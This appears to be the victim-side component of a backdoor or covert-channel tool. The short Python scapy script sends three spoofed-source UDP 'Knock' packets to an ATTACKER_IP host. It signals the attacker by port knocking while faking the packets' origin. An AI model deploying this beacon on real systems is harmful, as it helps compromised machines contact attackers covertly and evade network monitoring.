from time import sleep
from scapy.all import *
from scapy.layers.inet import IP, UDP
from config import *


def main():
    # Main loop
    packet = IP(dst=ATTACKER_IP, src=knock_1) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
    send(packet)
    sleep(1)
    packet = IP(dst=ATTACKER_IP, src=knock_2) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
    send(packet)
    sleep(1)
    packet = IP(dst=ATTACKER_IP, src=knock_3) / UDP(sport=int(VICTIM_PORT), dport=int(ATTACKER_PORT)) / "Knock"
    send(packet)


if __name__ == '__main__':
    main()